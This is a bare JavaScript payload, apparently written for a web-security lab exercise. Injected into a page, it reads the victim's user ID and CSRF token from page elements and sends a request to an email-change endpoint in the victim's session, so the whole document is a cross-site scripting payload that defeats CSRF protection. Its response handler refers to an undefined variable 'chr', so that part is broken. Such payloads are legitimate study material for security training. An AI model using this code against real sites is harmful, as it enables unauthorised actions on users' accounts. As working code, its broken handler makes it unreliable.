<script>
  xhr = new XMLHttpRequest();
  
  xhr.onreadystatechange = function () { 
     if(chr.readyState == 4 && xhr.status == 200) {
	   document.getElementById('result').innerHTML = xhr.responseText;
     }
  };

  uid = document.getElementById("uid").innerHTML.split(':')[1];
  csrf = document.getElementById("csrf").innerHTML.split(':')[1];  

  xhr.open('GET','/lab/webapp/jfp/17/email?name=john&uid='+uid+'&csrf_token='+csrf, true);
  xhr.send('');

</script>
